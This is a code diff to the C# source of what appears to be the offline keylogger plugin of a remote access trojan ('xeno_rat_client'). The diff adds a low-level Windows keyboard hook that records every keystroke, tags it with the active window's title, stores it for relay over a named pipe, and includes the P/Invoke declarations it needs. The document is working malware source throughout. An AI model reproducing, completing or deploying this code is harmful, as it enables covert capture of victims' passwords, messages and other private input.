@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.IO.Pipes;
 using System.Linq;
@@ -18,6 +19,7 @@ namespace Plugin
         bool started = false;
         bool owner = true;
         bool FULLSTOP = false;
+        IntPtr key_hook= IntPtr.Zero;
         CancellationTokenSource FULLSTOP_token = new CancellationTokenSource();
         Dictionary<string, string> applicationkeylogs;
         string pipename = "OfflineKeyloggerPipe";
@@ -52,6 +54,7 @@ namespace Plugin
                 try
                 {
                     byte[] data = await node.ReceiveAsync();
+                    Console.WriteLine(data[0]);
                     if (data == null)
                     {
                         break;
@@ -67,7 +70,8 @@ namespace Plugin
                     }
                     else if (data[0] == 1)
                     {
-                        await Start();
+                        Console.WriteLine("start");
+                        Start();
                     }
                     else if (data[0] == 2)
                     {
@@ -97,7 +101,8 @@ namespace Plugin
             {
                 while (!FULLSTOP) 
                 {
-                    await Task.Delay(5000);
+                    Application.DoEvents();
+                    await Task.Delay(1);
                 }
             }
 
@@ -112,7 +117,7 @@ namespace Plugin
         {
 
             applicationkeylogs = new Dictionary<string, string>();
-            keylogloop();
+            //keylogloop();
             while (!FULLSTOP)
             {
                 NamedPipeServerStream server = new NamedPipeServerStream(pipename, PipeDirection.InOut, 254, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
@@ -204,6 +209,11 @@ namespace Plugin
                 FULLSTOP = true;
                 FULLSTOP_token.Cancel();
                 FULLSTOP_token.Dispose();
+                if (key_hook != IntPtr.Zero)
+                {
+                    UnhookWindowsHookEx(key_hook);
+                    key_hook = IntPtr.Zero;
+                }
                 return;
             }
             try
@@ -211,7 +221,30 @@ namespace Plugin
                 await client.WriteAsync(new byte[] { 5 }, 0, 1);
             }
             catch { }
+        }
+
+        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (started && nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
+                string character = GetCharacterFromKey((uint)vkCode, isShiftPressed);
+                string open_application = Utils.GetCaptionOfActiveWindow().Replace("*", "");
+                if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)//check for caps lock
+                {
+                    character = character.ToUpper();
+                }
+                if (!applicationkeylogs.ContainsKey(open_application))
+                {
+                    applicationkeylogs.Add(open_application, "");
+                }
+                Console.WriteLine(character);
+                applicationkeylogs[open_application] += character;
             }
+            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+        }
+
 
         public async Task keylogloop() 
         {
@@ -224,7 +257,7 @@ namespace Plugin
                 string retchar = await GetKey();
                 if (retchar != null)
                 {
-                    string open_application = xeno_rat_client.Utils.GetCaptionOfActiveWindow().Replace("*","");
+                    string open_application = Utils.GetCaptionOfActiveWindow().Replace("*","");
                     if (!applicationkeylogs.ContainsKey(open_application)) 
                     {
                         applicationkeylogs.Add(open_application, "");
@@ -272,6 +305,7 @@ namespace Plugin
                         dictionary[currentKey] = currentValue.ToString(); // Use ToString to get the string
                         currentKey = null;
                         currentValue.Clear();
+
                     }
                 }
                 else
@@ -344,9 +378,18 @@ namespace Plugin
         }
         public async Task Start() 
         {
-            if (owner)
+            if (owner && !started)
             {
                 started = true;
+                new Thread(() =>
+                {
+                    HookCallbackDelegate hcDelegate = HookCallback;
+                    Process currproc = Process.GetCurrentProcess();
+                    string mainModuleName = currproc.MainModule.ModuleName;
+                    currproc.Dispose();
+                    key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
+                    Application.Run();//this is blocking, fix it
+                }).Start();
                 return;
             }
             await client.WriteAsync(new byte[] { 2 }, 0, 1);
@@ -356,6 +399,13 @@ namespace Plugin
             if (owner)
             {
                 started = false;
+
+                if (key_hook != IntPtr.Zero) 
+                {
+                    UnhookWindowsHookEx(key_hook);
+                    key_hook= IntPtr.Zero;
+                }
+
                 return;
             }
             await client.WriteAsync(new byte[] { 3 }, 0, 1);
@@ -540,6 +590,25 @@ namespace Plugin
 
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        public static extern short GetKeyState(int keyCode);
+
+        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
+
+        [DllImport("user32.dll")]
+        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("user32.dll")]
+        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static int WH_KEYBOARD_LL = 13;
+        private static int WM_KEYDOWN = 0x100;
 
 
         [DllImport("user32.dll")]
